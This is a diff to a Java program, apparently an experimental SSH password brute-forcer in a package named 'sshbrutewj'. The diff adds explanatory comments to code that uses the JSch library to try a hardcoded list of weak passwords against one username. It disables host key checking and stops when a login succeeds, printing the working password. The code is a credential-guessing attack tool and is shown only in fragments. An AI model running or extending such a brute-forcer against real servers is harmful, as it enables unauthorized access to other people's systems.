@@ -1,19 +1,20 @@
 package solirs.sshbrutewj;
 
 
-import com.jcraft.jsch.*;
+import com.jcraft.jsch.*; //SSH library
 
 
 public class Main
 {
     public static void sshbrute() throws JSchException{
 
-        //This is an experimental 
+        //This is an experimental engine for the bruteforcer.
+
         String passes[] = {"helloworld", "test", "0000", "4444","P4ssw0rd"};
 
         int i;
-        JSch jsch = new JSch();
-        jsch.setConfig("StrictHostKeyChecking", "no");
+        JSch jsch = new JSch(); //Initialize jsch and the config
+        jsch.setConfig("StrictHostKeyChecking", "no"); //Disable StrictHostKeyChecking since it causes issues with the ssh connection.
 
         String user = "username";
 
@@ -25,6 +26,7 @@ public class Main
         for (i = 0; i < passes.length ; i++){
 
             try{
+                //Try to connect with the password, if it works exit and print the password.
 
 
                 System.out.println("Trying "+ passes[i]);
@@ -38,6 +40,7 @@ public class Main
                 System.exit(0);
                 
             }catch(Exception e){
+                //Continue if the password is wrong
                 continue;
             }
 
@@ -64,6 +67,7 @@ public class Main
     }
     public static void main( String[] args )
     {
+        //It all starts hre
         System.out.println("Starting...");
 
         try{
